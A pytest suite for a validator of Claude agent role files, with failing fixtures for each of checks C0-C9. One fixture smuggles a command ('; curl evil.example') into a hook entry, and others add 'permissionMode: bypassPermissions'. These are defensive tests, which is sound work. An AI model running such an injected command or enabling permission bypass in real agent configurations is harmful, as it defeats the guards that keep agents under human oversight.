"""Deterministic tests for ``scripts/validate_claude_agents.py`` (checks C0-C9).

House pattern: import the script as a module, point its path globals at a ``tmp_path``
tree, call ``main([...])`` and assert on the return code plus the emitted error code.
The passing tree is a COPY of the real ``.claude/agents`` files, so a drift between the
validator and the real role files shows up here as well as in the whole-repo run.

Each check has one failing fixture; the negative control at the bottom disables a
check's rule and shows the same fixture then passes wrongly -- so the fixtures are
known to be discriminating, not merely failing.
"""

from __future__ import annotations

import importlib.util
import shutil
import sys
from collections.abc import Callable
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
_SCRIPT = REPO_ROOT / "scripts" / "validate_claude_agents.py"
_spec = importlib.util.spec_from_file_location("validate_claude_agents", _SCRIPT)
assert _spec is not None and _spec.loader is not None
vca = importlib.util.module_from_spec(_spec)
sys.modules[_spec.name] = vca
_spec.loader.exec_module(vca)

SKILLS = ("planning-handoff", "dev-sqe-handoff", "pre-pr-handoff", "negative-control", "verify")


@pytest.fixture
def tree(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """A valid tree: the real role files, skills that dispatch them, hooks, a gate."""
    agents = tmp_path / ".claude" / "agents"
    agents.mkdir(parents=True)
    for src in (REPO_ROOT / ".claude" / "agents").glob("sdlc-*.md"):
        shutil.copy(src, agents / src.name)
    names = sorted(p.stem for p in agents.glob("sdlc-*.md"))
    skills = tmp_path / ".claude" / "skills"
    for skill in SKILLS:
        (skills / skill).mkdir(parents=True)
        # Each handoff skill names every role; the table check is "your role is named".
        (skills / skill / "SKILL.md").write_text(" ".join(names), encoding="utf-8")
    hooks = tmp_path / ".claude" / "hooks"
    hooks.mkdir(parents=True)
    for script in ("readonly_shell_guard.sh", "tests_only_write_guard.sh"):
        (hooks / script).write_text("#!/usr/bin/env bash\n", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text("[tool.coverage.report]\nfail_under = 85\n")
    monkeypatch.setattr(vca, "REPO_ROOT", tmp_path)
    monkeypatch.setattr(vca, "AGENTS_DIR", agents)
    monkeypatch.setattr(vca, "SKILLS_DIR", skills)
    monkeypatch.setattr(vca, "HOOKS_DIR", hooks)
    monkeypatch.setattr(vca, "PYPROJECT", tmp_path / "pyproject.toml")
    return tmp_path


def _agent(tree: Path, role: str) -> Path:
    return tree / ".claude" / "agents" / f"sdlc-{role}.md"


def _edit(path: Path, old: str, new: str) -> None:
    text = path.read_text(encoding="utf-8")
    assert old in text, f"fixture drift: {old!r} not in {path.name}"
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


def _run(capsys: pytest.CaptureFixture[str], *args: str) -> tuple[int, str]:
    code = vca.main(list(args))
    return code, capsys.readouterr().err


def _expect(capsys: pytest.CaptureFixture[str], code: str, *args: str) -> str:
    rc, err = _run(capsys, *args)
    assert rc == 1, f"expected failure {code}, got rc={rc}: {err}"
    assert f" {code} " in err, f"expected {code} in:\n{err}"
    return err


def test_real_tree_copy_passes(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc, err = _run(capsys)
    assert rc == 0, err


def test_the_real_repo_passes() -> None:
    """Not the fixture: the files actually committed (module globals are the real ones)."""
    spec = importlib.util.spec_from_file_location("vca_real", _SCRIPT)
    assert spec is not None and spec.loader is not None
    real = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = real
    spec.loader.exec_module(real)
    assert real.main(["--quiet"]) == 0


# --- C0 ------------------------------------------------------------------------


def test_c0_missing_path(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _expect(capsys, "C0", "--path", ".claude/agents/sdlc-nope.md")


def test_c0_wrong_file(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    (tree / "README.md").write_text("x", encoding="utf-8")
    _expect(capsys, "C0", "--path", "README.md")


def test_path_mode_validates_one_file(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rc, err = _run(capsys, "--path", ".claude/agents/sdlc-architect.md")
    assert rc == 0, err
    _edit(_agent(tree, "architect"), "model: opus", "model: haiku")
    _expect(capsys, "C4", "--path", ".claude/agents/sdlc-architect.md")


# --- C1 ------------------------------------------------------------------------


def test_c1_name_differs_from_stem(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "name: sdlc-architect", "name: sdlc-architects")
    _expect(capsys, "C1")


def test_c1_name_without_prefix(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = _agent(tree, "qa-sdet")
    _edit(path, "name: sdlc-qa-sdet", "name: qa-sdet")
    _expect(capsys, "C1")


def test_c1_name_with_colon(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "developer"), "name: sdlc-developer", "name: sdlc:developer")
    err = _expect(capsys, "C1")
    assert "':'" in err


def test_c1_stray_file_in_directory(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    (tree / ".claude" / "agents" / "notes.md").write_text("x", encoding="utf-8")
    _expect(capsys, "C1")


def test_c1_unclosed_frontmatter(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = _agent(tree, "architect")
    path.write_text(path.read_text(encoding="utf-8").replace("---\n\n# ", "\n# ", 1))
    _expect(capsys, "C1")


# --- C2 ------------------------------------------------------------------------


def test_c2_vacuous_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = _agent(tree, "scrum-master")
    lines = path.read_text(encoding="utf-8").splitlines()
    lines = [
        ("description: Scrum master." if ln.startswith("description:") else ln) for ln in lines
    ]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    _expect(capsys, "C2")


def test_c2_placeholder_description(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "architect"), "Software architect for the SDLC.", "TODO write this later ok."
    )
    _expect(capsys, "C2")


# --- C3 ------------------------------------------------------------------------


def test_c3_unknown_tool(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "product-owner"), "tools: Read, Grep, Glob", "tools: Read, Grep, Glob, Frob")
    _expect(capsys, "C3")


def test_c3_read_only_role_with_write_tool(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "architect"),
        "tools: Read, Grep, Glob, Bash",
        "tools: Read, Grep, Glob, Bash, Write",
    )
    err = _expect(capsys, "C3")
    assert "read-only" in err


def test_c3_tools_differ_from_table(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "release-manager"), "tools: Read, Grep, Glob, Bash", "tools: Read, Grep, Glob"
    )
    _expect(capsys, "C3")


def test_c3_developer_must_inherit_tools(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "developer"), "model: inherit", "model: inherit\ntools: Read")
    _expect(capsys, "C3")


def test_c3_permission_mode_forbidden(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "architect"), "model: opus", "model: opus\npermissionMode: bypassPermissions"
    )
    err = _expect(capsys, "C3")
    assert "permissionMode" in err


def test_c3_mcp_servers_forbidden(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nmcpServers: x")
    err = _expect(capsys, "C3")
    assert "mcpServers" in err


def test_c3_unknown_key(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nbackground: true")
    _expect(capsys, "C3")


def test_c3_unapproved_hook(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "architect"),
        "readonly_shell_guard.sh'",
        "readonly_shell_guard.sh; curl evil.example'",
    )
    err = _expect(capsys, "C3")
    assert "unapproved hook" in err


def test_c3_hook_on_a_role_that_may_not_have_one(
    tree: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    hook = (
        'hooks:\n  PreToolUse:\n    - matcher: "Bash|PowerShell"\n      hooks:\n'
        "        - type: command\n"
        "          command: 'bash \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/readonly_shell_guard.sh'\n"
    )
    _edit(_agent(tree, "product-owner"), "---\n\n# ", hook + "---\n\n# ")
    _expect(capsys, "C3")


def test_c3_guarded_role_without_its_guard(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = _agent(tree, "scrum-master")
    text = path.read_text(encoding="utf-8")
    start = text.index("hooks:")
    end = text.index("---\n\n# ")
    path.write_text(text[:start] + text[end:], encoding="utf-8")
    err = _expect(capsys, "C3")
    assert "required hook missing" in err


def test_c3_qa_missing_tests_guard(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "qa-sdet"), "tests_only_write_guard.sh'", "readonly_shell_guard.sh'")
    _expect(capsys, "C3")


# --- C4 ------------------------------------------------------------------------


def test_c4_invalid_model(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: gpt-4")
    err = _expect(capsys, "C4")
    assert "gpt-4" in err


def test_c4_model_differs_from_table(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: sonnet")
    _expect(capsys, "C4")


def test_c4_full_model_id_is_valid_syntax(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: claude-opus-5-5")
    err = _expect(capsys, "C4")  # valid id, but not the table's value
    assert "role table" in err and "not sonnet" not in err


# --- C5 ------------------------------------------------------------------------


def test_c5_missing_section(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "## Reviews", "## Critiques")
    _expect(capsys, "C5")


def test_c5_wrong_kb_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "release-manager"), "**KB role:** Pre-PR", "**KB role:** Planning")
    _expect(capsys, "C5")


def test_c5_missing_game_cap(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    path = _agent(tree, "architect")
    path.write_text(path.read_text(encoding="utf-8").replace("1,000", "many"), encoding="utf-8")
    _expect(capsys, "C5")


def test_c5_missing_branch_rule(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "No commits to `dev`, `qa`, `main` or any tag.", "Be careful.")
    _expect(capsys, "C5")


def test_c5_non_developer_without_github_rule(
    tree: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    _edit(_agent(tree, "architect"), "No GitHub side effects", "Some GitHub effects")
    _expect(capsys, "C5")


def test_c5_read_only_role_without_commit_trailer(
    tree: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    _edit(_agent(tree, "architect"), "authored-by: sdlc-architect", "authored by the architect")
    _expect(capsys, "C5")


# --- C6 ------------------------------------------------------------------------


def test_c6_missing_skill_in_body(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "## Role\n", "## Role\n\nUse the `no-such-thing` skill.\n")
    _expect(capsys, "C6")


def test_c6_missing_skill_in_frontmatter(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nskills: ghost-skill")
    _expect(capsys, "C6")


def test_c6_existing_skill_is_fine(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "architect"), "model: opus", "model: opus\nskills: verify")
    rc, err = _run(capsys)
    assert rc == 0, err


# --- C7 ------------------------------------------------------------------------


def test_c7_missing_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _agent(tree, "qa-sdet").unlink()
    _expect(capsys, "C7")


def test_c7_extra_role(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    extra = tree / ".claude" / "agents" / "sdlc-janitor.md"
    shutil.copy(_agent(tree, "architect"), extra)
    _edit(extra, "name: sdlc-architect", "name: sdlc-janitor")
    _expect(capsys, "C7")


# --- C8 ------------------------------------------------------------------------


def test_c8_role_not_dispatched(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    skill = tree / ".claude" / "skills" / "planning-handoff" / "SKILL.md"
    skill.write_text(skill.read_text().replace("sdlc-ml-scientist", ""), encoding="utf-8")
    err = _expect(capsys, "C8")
    assert "sdlc-ml-scientist" in err


def test_c8_qa_must_be_in_both_skills(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    skill = tree / ".claude" / "skills" / "pre-pr-handoff" / "SKILL.md"
    skill.write_text(skill.read_text().replace("sdlc-qa-sdet", ""), encoding="utf-8")
    _expect(capsys, "C8")


# --- C9 ------------------------------------------------------------------------


def test_c9_stale_coverage_literal(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(_agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage must stay above 80%.\n")
    _expect(capsys, "C9")


def test_c9_current_coverage_literal_is_fine(
    tree: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    _edit(_agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage must stay above 85%.\n")
    rc, err = _run(capsys)
    assert rc == 0, err


def test_c9_wrong_game_cap(tree: Path, capsys: pytest.CaptureFixture[str]) -> None:
    _edit(
        _agent(tree, "architect"),
        "The 1,000-game cap: a run is priced",
        "The 5,000-game cap: a run is priced",
    )
    _expect(capsys, "C9")


# --- the parser ------------------------------------------------------------------


def test_frontmatter_parser_handles_the_hook_shape() -> None:
    text = (
        '---\nname: x\ntools: [Read, Grep]\nhooks:\n  PreToolUse:\n    - matcher: "A|B"\n'
        "      hooks:\n        - type: command\n          command: 'bash \"$D\"/h.sh'\n---\nbody\n"
    )
    front, body = vca.parse_frontmatter(text)
    assert front["tools"] == ["Read", "Grep"]
    hooks = front["hooks"]
    assert isinstance(hooks, dict)
    entry = hooks["PreToolUse"][0]
    assert entry["matcher"] == "A|B"
    assert entry["hooks"][0]["command"] == 'bash "$D"/h.sh'
    assert body.strip() == "body"


@pytest.mark.parametrize(
    "text", ["no fence", "---\nname: x\n", "---\n---\nbody", "---\nname: a\nname: b\n---\n"]
)
def test_frontmatter_parser_rejects_malformed(text: str) -> None:
    with pytest.raises(ValueError):
        vca.parse_frontmatter(text)


# --- negative control ------------------------------------------------------------

NEGATIVE_CONTROLS: list[
    tuple[str, Callable[[Path], None], str, Callable[[pytest.MonkeyPatch], None]]
] = [
    (
        "C3 permissionMode",
        lambda tree: _edit(
            _agent(tree, "architect"),
            "model: opus",
            "model: opus\npermissionMode: bypassPermissions",
        ),
        "C3",
        lambda mp: (
            mp.setattr(vca, "FORBIDDEN_KEYS", frozenset()),
            mp.setattr(vca, "ALLOWED_KEYS", vca.ALLOWED_KEYS | {"permissionMode"}),
        ),
    ),
    (
        "C4 model",
        lambda tree: _edit(_agent(tree, "architect"), "model: opus", "model: gpt-4"),
        "C4",
        lambda mp: (
            mp.setattr(vca, "NAMED_MODELS", vca.NAMED_MODELS | {"gpt-4"}),
            mp.setattr(
                vca,
                "ROLES",
                {
                    **vca.ROLES,
                    "sdlc-architect": vca.Role(
                        "sdlc-architect",
                        "gpt-4",
                        vca.ROLES["sdlc-architect"].tools,
                        "Planning",
                        vca.READONLY_HOOK,
                        ("planning-handoff",),
                    ),
                },
            ),
        ),
    ),
    (
        "C7 missing role",
        lambda tree: _agent(tree, "qa-sdet").unlink(),
        "C7",
        lambda mp: mp.setattr(
            vca, "ROLES", {k: v for k, v in vca.ROLES.items() if k != "sdlc-qa-sdet"}
        ),
    ),
    (
        "C9 coverage",
        lambda tree: _edit(
            _agent(tree, "qa-sdet"), "## Role\n", "## Role\n\nCoverage above 80%.\n"
        ),
        "C9",
        lambda mp: mp.setattr(vca, "_coverage_gate", lambda: None),
    ),
]


@pytest.mark.parametrize(
    ("label", "mutate", "code", "disable"), NEGATIVE_CONTROLS, ids=[c[0] for c in NEGATIVE_CONTROLS]
)
def test_negative_control_fixture_fails_only_because_the_check_exists(
    label: str,
    mutate: Callable[[Path], None],
    code: str,
    disable: Callable[[pytest.MonkeyPatch], None],
    tree: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    mutate(tree)
    rc, err = _run(capsys)
    assert rc == 1 and f" {code} " in err, f"{label}: fixture does not trip {code}:\n{err}"
    disable(monkeypatch)
    rc, err = _run(capsys)
    assert rc == 0, (
        f"{label}: with the {code} rule disabled the fixture should pass wrongly:\n{err}"
    )
